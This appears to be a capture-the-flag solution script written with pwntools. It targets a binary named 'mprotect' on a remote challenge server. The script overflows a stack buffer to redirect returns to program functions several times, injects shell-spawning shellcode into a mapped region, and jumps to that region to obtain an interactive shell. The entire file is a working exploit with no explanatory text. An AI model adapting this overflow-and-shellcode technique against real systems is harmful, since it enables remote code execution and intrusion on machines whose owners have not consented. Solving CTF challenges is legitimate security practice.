from pwn import *

elf = context.binary = ELF("mprotect")

#p=process("./mprotect")
p=remote("pwn.sh4dy.com",5004)

for i in range(7):
    p.recvline()

p.sendline("1")
p.recvline()
for i in range(6):
    p.recvline()

p.sendline("2")

payload1 = b'a'*56 + p64(elf.sym.increaseCounter) + p64(elf.sym.overflow)
print(len(payload1))
for i in range(6):
    p.recvline()
    p.send(payload1)
    p.recvline()


p.recvline()
payload2 = b'a'*56 + p64(elf.sym.increaseCounter) + p64(elf.sym.main)
p.send(payload2)
p.recvline()

for i in range(7):
    p.recvline()
    
p.sendline("3")

for i in range(6):
    p.recvline()

p.sendline("1")
p.recvline()
p.recvline()

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

start_addr_mmap = 0x500000

for i in range(6):
    p.recvline()

p.sendline("2")

payload3 = b'a'*56 + p64(start_addr_mmap)
p.recvline()
p.sendline(payload3)
p.recvline()
p.interactive()